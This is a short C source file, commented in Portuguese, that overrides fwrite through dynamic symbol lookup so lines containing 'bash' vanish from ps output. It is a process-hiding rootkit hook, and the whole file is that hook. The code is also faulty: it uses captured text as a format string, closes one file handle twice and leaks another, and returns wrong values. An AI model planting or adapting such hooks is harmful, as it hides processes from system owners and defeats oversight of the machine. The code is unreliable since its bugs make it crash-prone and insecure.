#define _GNU_SOURCE
//Programa ser mantido escondido da execução de ps
#define HIDDEN "bash"
#define TEMP_FILE "temp.txt"
#define MAX_STRING 4096
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

typedef size_t* (*orig_fwrite_type)(const void *ptr, size_t size, size_t nmemb, FILE *stream);

size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream){
  char large_str[MAX_STRING];
  char* str_ptr = (char*)ptr;

  orig_fwrite_type orig_fwrite;
  orig_fwrite = (orig_fwrite_type)dlsym(RTLD_NEXT,"fwrite");

  //Salva componentes da linha em arquivo temporario
  FILE *fd = fopen(TEMP_FILE,"a+");
  fprintf(fd,str_ptr);
  fclose(fd);
  //Troca para enable a leitura
  FILE *tf = fopen(TEMP_FILE,"r");

  //Caso seja o arquivo HIDDEN, deleta arquivo temporario e retorna
  if(strstr(str_ptr,HIDDEN) != NULL){
    remove(TEMP_FILE);
    fclose(tf);
    return 0;
  }
  //Caso seja componente de final de linha* imprime toda a linha
  //e retorna. *Final de linha tem '\n'
  else if(str_ptr[strlen(str_ptr)-1] == '\n'){
    fgets(large_str,MAX_STRING,tf);
    fprintf(stdout, large_str);
    remove(TEMP_FILE);
    fclose(tf);
    return 1;
  }
  //Caso seja componente de meio de linha retorna
  fclose(fd);
  return 1;
}
